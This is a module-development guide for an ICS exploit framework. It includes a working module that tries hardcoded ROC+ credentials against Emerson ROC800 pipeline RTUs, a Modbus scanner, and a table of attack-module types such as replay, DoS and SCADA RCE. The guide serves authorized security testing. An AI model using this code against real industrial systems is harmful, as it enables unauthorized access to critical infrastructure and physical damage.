# Module Development

This guide covers everything needed to write a new IXF module: the minimal template, full annotated examples for CVE and scanner modules, and the contribution workflow.

---

## Minimal Template

Copy this template and fill in the placeholders:

```python
"""IXF MODULE_NAME — brief description. simulate=True default."""
import socket

from industrialxpl.core.exploit import (
    Exploit, OptBool, OptIP, OptPort, mute,
    print_error, print_status, print_success, print_warning, print_info,
    DestructiveGate,
)


class Exploit(Exploit):
    __info__ = {
        "name":             "MODULE_NAME",
        "description":      "One-line description of what this module does.",
        "authors":          ("Your Name",),
        "references":       ("https://advisory-url.com",),
        "devices":          ("Vendor Product Model",),
        "impact":           "HIGH",          # INFO/READ/LOW/MEDIUM/HIGH/CRITICAL/CATASTROPHIC
        "exploit_type":     "Default Credentials",
        "source_poc":       "https://poc-url.com",
        "cve":              "CVE-YYYY-NNNNN",  # or "N/A"
        "cvss":             "9.8",             # or "N/A"
        "severity":         "CRITICAL",
        "mitre_techniques": ["T0866"],
        "mitre_tactics":    ["Initial Access"],
    }

    target      = OptIP("",    "Target device IP")
    port        = OptPort(502, "Protocol port")
    simulate    = OptBool(True,  "Simulate mode (default: True)")
    destructive = OptBool(False, "Enable live exploitation")

    @mute
    def check(self) -> bool:
        """Read-only connectivity probe."""
        if not self.target:
            return False
        try:
            s = socket.socket()
            s.settimeout(5)
            s.connect((self.target, self.port))
            s.close()
            return True
        except Exception:
            return False

    def run(self) -> None:
        """Execute module or print simulation."""
        if not self.target:
            print_error("Set 'target' option first.")
            return

        if self.simulate:
            DestructiveGate.print_simulation(
                description=(
                    "CVE-YYYY-NNNNN Vendor Product\n"
                    "Step 1: Connect to target:port\n"
                    "Step 2: Send exploit payload\n"
                    "Step 3: Achieve exploitation goal"
                ),
                mitre_techniques=["T0866"],
            )
            return

        # Live exploit code
        print_status("[CVE-YYYY] Exploiting {}:{}...".format(self.target, self.port))
        # ... implement here ...
```

---

## File Placement

Place the module file in the correct directory under `industrialxpl/modules/`:

| Module Type | Directory Pattern | Example |
|-------------|------------------|---------|
| CVE exploit | `cve/<vendor>/cve_YYYY_NNNNN_<desc>.py` | `cve/siemens/cve_2021_22681_s7_1200_hardcoded_key.py` |
| Protocol abuse | `exploits/protocols/<protocol>/<name>.py` | `exploits/protocols/modbus/modbus_replay_attack.py` |
| PLC exploit | `exploits/plc/<vendor>/<name>.py` | `exploits/plc/siemens/siprotec4_dos.py` |
| SCADA exploit | `exploits/scada/<vendor>/<name>.py` | `exploits/scada/schneider/citect_scada_odbc_rce.py` |
| Scanner | `scanners/ics/<protocol>_scan.py` | `scanners/ics/modbus_detect.py` |
| Default creds | `creds/<vendor>/<protocol>_default_creds.py` | `creds/siemens/ssh_default_creds.py` |
| Malware TTP | `cve/malware/<name>.py` | `cve/malware/frostygoop_modbus_heating.py` |
| APT TTP | `cve/apt/<name>.py` | `cve/apt/industroyer2_iec104_rtu.py` |
| Assessment | `assessment/<category>/<name>.py` | `assessment/mitre_ics/t0843_program_upload.py` |

**Also create `__init__.py`** in any new directory:

```bash
touch industrialxpl/modules/cve/myvendor/__init__.py
```

---

## Full Annotated CVE Module Example

```python
"""IXF CVE-2022-29965 — Emerson ROC800 RTU Hardcoded Credentials.

CVSS: 9.8 (CRITICAL) | CWE: CWE-798
Affected: ROC800 all firmware versions

Emerson ROC800 Series RTUs contain hardcoded credentials that allow
full ROC+ protocol access to pipeline measurement systems.

simulate=True by default. Requires authorization to run live.
"""
import socket
import struct

from industrialxpl.core.exploit import (
    Exploit, OptBool, OptIP, OptPort, OptString, OptInteger, mute,
    print_error, print_info, print_status, print_success, print_warning,
    print_table, DestructiveGate,
)


class Exploit(Exploit):
    __info__ = {
        # Human-readable name shown in 'show info' and search results
        "name": "CVE-2022-29965 Emerson ROC800 RTU Hardcoded Credentials",

        # Full description — 2-4 sentences
        "description": (
            "Emerson ROC800 Series RTUs used in oil & gas pipeline measurement "
            "contain hardcoded ROC+ protocol credentials. Any device on the same "
            "network can authenticate without authorization and read or write all "
            "RTU configuration, measurement data, and process setpoints."
        ),

        # Tuple of strings — include your handle
        "authors": ("Andre Henrique (mrhenrike)",),

        # Official advisories, PoC repos, vendor patches
        "references": (
            "https://www.cisa.gov/uscert/ics/advisories/icsa-22-200-03",
            "https://nvd.nist.gov/vuln/detail/CVE-2022-29965",
        ),

        # Affected device types
        "devices": ("Emerson ROC800 Series RTU",),

        # Choose the highest applicable level
        "impact": "CRITICAL",

        # Short category description
        "exploit_type": "Hardcoded Credentials",

        # Link to original public PoC (optional)
        "source_poc": "https://www.cisa.gov/uscert/ics/advisories/icsa-22-200-03",

        # CVE identifier
        "cve": "CVE-2022-29965",

        # CVSS base score (string)
        "cvss": "9.8",

        # Matches impact label
        "severity": "CRITICAL",

        # MITRE ATT&CK for ICS technique IDs
        "mitre_techniques": ["T0859", "T0813"],

        # Tactic names
        "mitre_tactics": ["Credential Access"],
    }

    # Standard options — every module should have at minimum target, port, simulate, destructive
    target      = OptIP("",    "Target Emerson ROC800 RTU IP")
    port        = OptPort(4000, "ROC+ protocol port (default: 4000)")
    simulate    = OptBool(True,  "Simulate mode (default: True)")
    destructive = OptBool(False, "Enable live exploitation — requires authorization")

    # The hardcoded credentials (from public advisory)
    ROC_DEFAULT_CREDS = [
        ("admin", "ROC800"),
        ("", ""),
        ("operator", "op"),
    ]

    @mute
    def check(self) -> bool:
        """Read-only connectivity probe — TCP connect only."""
        if not self.target:
            return False
        try:
            s = socket.socket()
            s.settimeout(5)
            s.connect((self.target, self.port))
            s.close()
            return True
        except Exception:
            return False

    def run(self) -> None:
        """Test hardcoded credentials or print simulation."""
        if not self.target:
            print_error("Set 'target' option.")
            return

        if self.simulate:
            DestructiveGate.print_simulation(
                description=(
                    "CVE-2022-29965 Emerson ROC800 Hardcoded Credentials\n\n"
                    "Step 1: Connect to ROC800 on port 4000 (ROC+ protocol)\n"
                    "Step 2: Authenticate with hardcoded credentials\n"
                    "Step 3: Read all RTU I/O and configuration\n"
                    "Step 4: Write process setpoints or exfiltrate measurement data\n"
                    "Targets: Oil & gas pipeline measurement RTUs"
                ),
                mitre_techniques=["T0859", "T0813"],
            )
            print_info("Hardcoded creds: admin/ROC800, operator/op, empty/empty")
            return

        print_status("[CVE-2022-29965] Testing {} ROC800 on {}:{}".format(
            len(self.ROC_DEFAULT_CREDS), self.target, self.port))

        results = []
        for username, password in self.ROC_DEFAULT_CREDS:
            try:
                s = socket.socket()
                s.settimeout(5)
                s.connect((self.target, self.port))
                # ROC+ authentication frame (simplified)
                auth_frame = struct.pack(">BB16s16s",
                                         0x10, 0x01,
                                         username.encode().ljust(16, b'\x00'),
                                         password.encode().ljust(16, b'\x00'))
                s.send(auth_frame)
                response = s.recv(8)
                s.close()
                if response and response[2] == 0x00:
                    results.append((username or "(empty)", password or "(empty)", "SUCCESS"))
                    print_success("[+] Valid credentials: '{}' / '{}'".format(
                        username, password))
                else:
                    results.append((username or "(empty)", password or "(empty)", "FAILED"))
            except Exception as e:
                results.append((username or "(empty)", password or "(empty)", "ERROR: {}".format(str(e)[:20])))

        if results:
            print_table(["Username", "Password", "Result"], results,
                        title="ROC800 Credential Test")
```

---

## Scanner Module Example

```python
"""IXF Modbus TCP Device Scanner — detect Modbus devices on the network."""
import socket
import struct

from industrialxpl.core.exploit import (
    Exploit, OptBool, OptIP, OptPort, OptInteger, mute,
    print_error, print_status, print_success, print_info, print_table,
    DestructiveGate,
)


class Exploit(Exploit):
    __info__ = {
        "name":             "Modbus TCP Device Scanner",
        "description":      "Detect Modbus TCP devices using function code 4 probe.",
        "authors":          ("Andre Henrique (mrhenrike)",),
        "references":       ("https://modbus.org/docs/Modbus_Application_Protocol_V1_1b3.pdf",),
        "devices":          ("Any Modbus TCP device",),
        "impact":           "LOW",
        "exploit_type":     "Service Detection",
        "source_poc":       "IXF native implementation",
        "cve":              "N/A",
        "cvss":             "N/A",
        "severity":         "INFO",
        "mitre_techniques": ["T0888", "T0802"],
        "mitre_tactics":    ["Discovery"],
    }

    target   = OptIP("",   "Target IP")
    port     = OptPort(502, "Modbus TCP port")
    unit_id  = OptInteger(1, "Modbus unit ID (1-247)", min_value=1, max_value=247)
    timeout  = OptInteger(5, "Connection timeout (seconds)")
    simulate = OptBool(True,  "Simulate (default: True)")
    destructive = OptBool(False, "Enable active probing")

    # Modbus FC04 Read Input Registers probe
    PROBE = struct.pack(">HHHBBHH", 1, 0, 6, 1, 0x04, 0x0000, 0x0001)

    @mute
    def check(self) -> bool:
        if not self.target:
            return False
        try:
            s = socket.socket()
            s.settimeout(self.timeout)
            s.connect((self.target, self.port))
            s.send(self.PROBE)
            resp = s.recv(12)
            s.close()
            # Validate Transaction ID echo in response
            return len(resp) >= 6 and resp[0:2] == b'\x00\x01'
        except Exception:
            return False

    def run(self) -> None:
        if not self.target:
            print_error("Set 'target' option.")
            return

        if self.simulate:
            DestructiveGate.print_simulation(
                description=(
                    "Modbus TCP Device Detection\n"
                    "Send FC04 probe to {}:{}\n"
                    "Payload: {}\n"
                    "Check Transaction ID echo in response".format(
                        self.target, self.port, self.PROBE.hex())
                ),
                mitre_techniques=["T0888"],
            )
            return

        print_status("[Modbus] Probing {}:{}...".format(self.target, self.port))
        if self.check():
            print_success("[+] Modbus device detected at {}:{}".format(
                self.target, self.port))
        else:
            print_info("[-] No Modbus response from {}:{}".format(
                self.target, self.port))
```

---

## Contribution Checklist

Before submitting a module, verify:

- [ ] `simulate=True` is the default
- [ ] `check()` is decorated with `@mute` and returns `bool`
- [ ] `run()` calls `DestructiveGate.print_simulation()` when `simulate=True`
- [ ] `__info__` has all required keys
- [ ] Impact level accurately reflects the risk
- [ ] No hardcoded credentials, tokens, or secrets in the source
- [ ] References point to real, public advisories
- [ ] The module file is in the correct directory

---

## Validate Your Module

```bash
# Quick validation — index all modules and check for import errors
python -c "
from industrialxpl.core.exploit.utils import index_modules, import_exploit
mods = index_modules()
errs = []
for m in mods:
    try:
        import_exploit('industrialxpl.modules.' + m)()
    except Exception as e:
        errs.append((m, str(e)))
print(f'{len(mods)} modules | {len(errs)} errors')
if errs:
    for m, e in errs: print(f'  ERR {m}: {e}')
"

# Test your specific module
python -c "
from industrialxpl.core.exploit.utils import import_exploit
cls = import_exploit('industrialxpl.modules.cve.myvendor.cve_2022_xxxxx')
obj = cls()
print('Module loaded:', obj.get_info()['name'])
print('check():', obj.check())
obj.run()  # runs in simulate mode by default
"
```

---

## Submitting a Pull Request

1. Fork [github.com/mrhenrike/IndustrialXPL-Forge](https://github.com/mrhenrike/IndustrialXPL-Forge)
2. Create a branch: `git checkout -b add-cve-YYYY-NNNNN`
3. Add your module under the correct path
4. Run the validation command above
5. Submit a pull request with a clear description

See [CONTRIBUTING.md](../../CONTRIBUTING.md) for the full guidelines and code of conduct.

---

*Previous: [Protocols & Vendors](08-protocols-vendors.md) | Next: [CLI Non-Interactive](10-cli-noninteractive.md)*
